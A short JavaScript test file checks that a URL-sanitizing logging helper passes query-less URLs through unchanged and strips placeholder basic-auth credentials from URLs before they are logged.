test("sanitizeUrlForLog returns a query-less URL verbatim (hot-path fast case)", () => {
  const raw = "https://api.example.com/v1/orders/12345/items";
  // No query, no fragment, no userinfo → returned unchanged without parsing.
  assert.equal(sanitizeUrlForLog(raw), raw);
  // Relative paths take the same fast path.
  assert.equal(sanitizeUrlForLog("/healthz"), "/healthz");
});

test("sanitizeUrlForLog strips userinfo credentials even without a query string", () => {
  // The `@` guard must route this through the parse path so basic-auth
  // credentials in the authority never survive into a log line.
  const safe = sanitizeUrlForLog("https://user:s3cr3t@api.example.com/data");
  assert.doesNotMatch(safe, /s3cr3t/);
  assert.doesNotMatch(safe, /user:/);
  assert.match(safe, /\/data/);
});
